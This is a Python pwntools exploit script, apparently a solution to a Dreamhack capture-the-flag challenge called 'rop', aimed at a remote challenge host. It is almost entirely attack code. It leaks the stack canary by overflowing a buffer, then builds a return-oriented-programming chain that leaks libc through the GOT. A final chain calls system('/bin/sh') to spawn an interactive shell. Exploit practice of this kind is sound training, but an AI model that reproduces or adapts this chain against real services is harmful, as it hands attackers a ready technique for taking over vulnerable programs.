from pwn import *

exe = ELF('rop_patched', checksec = False)
#r = process(exe.path)
r = remote('host3.dreamhack.games', 11704)
libc = ELF('libc-2.27.so', checksec = False)

#input()
payload = b'a'*0x39
r.sendafter('Buf: ', payload)
r.recvuntil(b'a'*0x38)
leak_canary = u64(r.recv(8))
log.info("leak canary fake: " + hex(leak_canary))
canary = leak_canary - 0x61
log.info("canary: " + hex(canary))

pop_rdi = 0x00000000004007f3
ret = 0x000000000040055e
read_got = exe.got['read']
read_plt = exe.plt['read']
puts_plt = exe.plt['puts']
main = exe.sym['main']

payload = b'a'*0x38 + p64(canary) + b'a'*8
payload += p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)
r.sendafter(b'Buf: ', payload)
read_leak = u64(r.recv(6) + b'\x00\x00')
log.info("read leak: " + hex(read_leak))
libc.address = read_leak - libc.sym['read']
log.info("libc leak: " + hex(libc.address))

payload = b'a'*0x38
r.sendafter('Buf: ', payload)

payload = b'a'*0x38 + p64(canary) + b'a'*8
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(ret)
payload += p64(libc.sym['system'])
r.recvuntil(b'[2] Input ROP payload')
r.sendafter(b'Buf: ',payload)


r.interactive()